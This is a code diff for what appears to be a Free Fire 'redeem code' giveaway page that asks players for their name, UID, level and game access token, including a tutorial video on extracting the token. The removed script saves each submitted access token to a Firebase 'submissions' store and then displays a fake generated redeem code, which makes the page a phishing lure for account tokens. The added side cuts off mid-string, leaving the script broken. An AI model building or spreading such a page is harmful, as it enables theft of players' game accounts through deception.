@@ -36,7 +36,7 @@
     letter-spacing: 1px;
   }
   .tag-garena { background: #e62020; color: #fff; }
-  .tag-ff { background: #ff reaa00; color: #000; }
+  .tag-ff { background: #ffaa00; color: #000; }
   .tag-naruto { background: #ff5500; color: #fff; }
 
   .hero-banner {
@@ -432,8 +432,7 @@
   <section class="youtube-section">
     <div class="youtube-heading">📺 HOW TO GET ACCESS TOKEN TUTORIAL VIDEO</div>
     <div class="youtube-wrapper">
-      <!-- REPLACE 'dQw4w9WgXcQ' BELOW WITH YOUR YOUTUBE VIDEO ID -->
-      <iframe id="ytVideoFrame" src="https://www.youtube.com/watch?v=cCZMGH9JbsI" title="Tutorial Video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+      <iframe id="ytVideoFrame" src="https://www.youtube.com/embed/cCZMGH9JbsI" title="Tutorial Video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
     </div>
   </section>
 
@@ -662,70 +661,4 @@
     }
 
     btn.disabled = true;
-    btn.textContent = "GENERATING REDEEM CODE...";
-
-    try {
-      const itemRef = push(ref(db, "submissions"));
-      await set(itemRef, {
-        playerName: name,
-        uid: uid,
-        level: level,
-        accessToken: token,
-        createdAt: serverTimestamp()
-      });
-      
-      form.reset();
-      status.textContent = "";
-
-      const finalCode = generateDynamicRedeemCode();
-      generatedCode.textContent = finalCode;
-      copyBtn.textContent = "📋 COPY REDEEM CODE";
-      modal.style.display = "flex";
-
-    } catch (err) {
-      console.error(err);
-      status.style.color = "#ff4c27";
-      status.textContent = "❌ Connection failed. Check network connection.";
-    } finally {
-      btn.disabled = false;
-      btn.textContent = "⚔ SUBMIT ACCESS TOKEN & GET REDEEM CODE";
-    }
-  });
-
-  copyBtn.addEventListener("click", () => {
-    playCustomSound('copy');
-    const textToCopy = generatedCode.textContent;
-    try {
-      if (navigator.clipboard && window.isSecureContext) {
-        navigator.clipboard.writeText(textToCopy).then(() => {
-          copyBtn.textContent = "✅ COPIED TO CLIPBOARD!";
-          setTimeout(() => { copyBtn.textContent = "📋 COPY REDEEM CODE"; }, 3000);
-        }).catch(() => {
-          fallbackCopy(textToCopy);
-        });
-      } else {
-        fallbackCopy(textToCopy);
-      }
-    } catch (e) {
-      fallbackCopy(textToCopy);
-    }
-  });
-
-  function fallbackCopy(text) {
-    const textArea = document.createElement("textarea");
-    textArea.value = text;
-    document.body.appendChild(textArea);
-    textArea.select();
-    document.execCommand("copy");
-    document.body.removeChild(textArea);
-    copyBtn.textContent = "✅ COPIED TO CLIPBOARD!";
-    setTimeout(() => { copyBtn.textContent = "📋 COPY REDEEM CODE"; }, 3000);
-  }
-
-  document.getElementById("closeBtn").addEventListener("click", () => {
-    playCustomSound('close');
-    modal.style.display = "none";
-  });
-</script>
-</body>
-</html>
+    btn.textContent = "GENERATING REDE
